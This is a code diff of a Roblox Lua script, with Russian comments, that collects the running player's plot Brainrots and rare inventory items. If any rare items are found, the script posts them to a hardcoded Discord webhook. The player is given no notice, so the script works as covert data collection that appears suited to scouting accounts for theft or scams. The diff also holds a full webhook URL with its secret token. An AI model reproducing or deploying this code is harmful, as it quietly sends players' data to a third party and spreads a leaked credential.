@@ -3,15 +3,59 @@ local Workspace = game:GetService("Workspace")
 local HttpService = game:GetService("HttpService")
 
 local localPlayer = Players.LocalPlayer
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1417846130619977738/mgmCuOeNpaNOBQddZUtCPaeheSjaBWdLNLfPPg2xk6-533OjiGgbjxwmkKPsQO7TK9ep"
 
 -- === Список разрешённых секреток ===
-local allowItems = {
+local ALLOW_ITEMS = {
     "Garamararam",
     "UltraBrain",
-    "LegendaryTool",
+    "LegendaryTool"
 }
 
--- === Сбор инвентаря с фильтром секреток ===
+-- === Найти плот игрока ===
+local function findPlayerPlot()
+    local plots = Workspace:FindFirstChild("Plots")
+    if not plots then return nil end
+
+    for _, plot in ipairs(plots:GetChildren()) do
+        if plot:FindFirstChild("PlayerSign") and plot.PlayerSign:FindFirstChild("BillboardGui") then
+            local label = plot.PlayerSign.BillboardGui:FindFirstChild("TextLabel")
+            if label and label.Text == localPlayer.DisplayName then
+                return plot
+            end
+        end
+    end
+    return nil
+end
+
+-- === Сбор Brainrots ===
+local function collectBrainrots(plot)
+    if not plot then return "❌ Plot не найден" end
+    local brainrotsText = ""
+    local container = plot:FindFirstChild("Brainrots")
+    if not container then return "❌ Нет Brainrots" end
+
+    for i = 1, 17 do
+        local node = container:FindFirstChild(tostring(i))
+        if node and node:FindFirstChild("Brainrot") then
+            local br = node.Brainrot
+            local ui = br:FindFirstChild("PlatformUI")
+            if ui and ui:FindFirstChild("Title") then
+                local text = ui.Title.Text
+                if text and text ~= "" then
+                    brainrotsText = brainrotsText .. ("Brainrot %d: %s\n"):format(i, text)
+                end
+            end
+        end
+    end
+
+    if brainrotsText == "" then
+        brainrotsText = "⚠️ Пусто"
+    end
+    return brainrotsText
+end
+
+-- === Сбор инвентаря только секреток ===
 local function collectInventory()
     local items = {}
 
@@ -19,7 +63,7 @@ local function collectInventory()
         if not container then return end
         for _, item in ipairs(container:GetChildren()) do
             if item:IsA("Tool") then
-                for _, allowed in ipairs(allowItems) do
+                for _, allowed in ipairs(ALLOW_ITEMS) do
                     if item.Name == allowed then
                         table.insert(items, item.Name)
                         break
@@ -33,23 +77,19 @@ local function collectInventory()
     addItemsFrom(localPlayer.Character)
 
     if #items == 0 then
-        return nil -- нет секреток
+        return nil -- нет секреток — ничего не отправляем
     else
-        local invText = "\n--- Inventory ---\n"
+        local text = "\n--- Inventory ---\n"
         for _, name in ipairs(items) do
-            invText = invText .. "- " .. name .. "\n"
+            text = text .. "- " .. name .. "\n"
         end
-        return invText
+        return text
     end
 end
 
--- === Основной запуск ===
-local inventory = collectInventory()
-if inventory then
-    local brainrots = "❌ Brainrots проверка отключена" -- или можно добавить свою функцию
-    local content = brainrots .. inventory
-
-    local url = "https://discord.com/api/webhooks/1417846130619977738/mgmCuOeNpaNOBQddZUtCPaeheSjaBWdLNLfPPg2xk6-533OjiGgbjxwmkKPsQO7TK9ep" -- сюда свой вебхук
+-- === Отправка в Discord ===
+local function sendToDiscord(content)
+    if not content then return end
     local body = HttpService:JSONEncode({
         ["embeds"] = {{
             ["title"] = "**Brainrots | Elly**",
@@ -60,5 +100,15 @@ if inventory then
             }
         }}
     })
-    HttpService:PostAsync(url, body, Enum.HttpContentType.ApplicationJson)
+    -- отправка через PostAsync
+    HttpService:PostAsync(WEBHOOK_URL, body, Enum.HttpContentType.ApplicationJson)
+end
+
+-- === Основной запуск ===
+local plot = findPlayerPlot()
+local brainrots = collectBrainrots(plot)
+local inventory = collectInventory()
+
+if inventory then
+    sendToDiscord(brainrots .. inventory)
 end
